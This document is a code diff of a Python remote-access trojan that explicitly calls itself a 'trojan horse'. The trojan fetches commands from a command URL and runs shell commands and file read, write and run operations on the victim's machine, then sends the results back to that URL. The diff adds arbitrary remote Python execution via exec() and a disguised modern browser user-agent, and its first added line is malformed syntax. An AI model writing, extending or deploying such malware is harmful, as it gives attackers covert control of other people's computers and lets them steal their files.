@@ -1,4 +1,4 @@
-import urllib.request as request
+contents = import urllib.request as request
 import urllib.parse as parse
 from urllib.parse import quote, unquote
 
@@ -7,8 +7,10 @@ import os
 import sys
 import random
 import base64
-import string
 
+
+
+"""encryption algorithms"""
 def encrypt(plaintext: str) -> str:
     #add random charecters to plaintext- still no encryption
     randomtext = ''
@@ -44,9 +46,13 @@ def decrypt(html : str) -> str:
     plaintext = randomtext[::2]
     return plaintext
 
+
+
+
+"""powerhouse of trojan horse"""
 class Trojan:
     def __init__(self, commandurl,\
-                useragent='Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5',\
+                useragent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',\
                 computerid = 'None', **headers):
         self.commandurl = commandurl
         self.useragent = useragent
@@ -71,12 +77,11 @@ class Trojan:
         return commands
     
     def sendoutcome(self, outcome: dict) -> str:
-        print('sending ', outcome)
-        data = parse.quote(encrypt(outcome)).encode('utf-8')
+        print('[*] -> sending ', outcome)
+        data = parse.quote(encrypt(str(outcome))).encode('utf-8')
         req = request.Request(self.commandurl, data=data, headers = self.headers)
         with request.urlopen(req) as response:
             response = response.read().decode()
-        print('sent')
         return response
             
     def run(self):
@@ -85,9 +90,10 @@ class Trojan:
         |file-read- read a file from computer- input is [*files], output is [*[file name, content/error]]
         |file-write- write files to computer- input is [*[file name, file content]], output is [*[file name, errors]]
         |file-run- run files on computer- input is [*files], output is [*[file name, errors]]
+        |python- run a python command- input is [*commands], output is [*[command, outcome]]
         """
         commands = self.commands()
-        outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
+        outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : [], 'python' : []}
         for key, values in commands.items():
             if key.lower() == 'cmd':
                 for cmd in values: #just keeps running seemingly random values
@@ -129,7 +135,13 @@ class Trojan:
                     else:
                         output += '\n\n[*] Invalid file type\n\n'
                     outcomes['file-run'].append([value, output])
+            elif key.lower() == 'python':
+                for value in values:
+                    try:
+                        exec(value)
+                        output = 'executed %s correctly' % value
+                    except Exception as e:
+                        output = e
+                    outcomes['python'].append([value, output])
         outcomes = str(outcomes)
-        print('sending...')
         self.sendoutcome(outcomes)
-                    
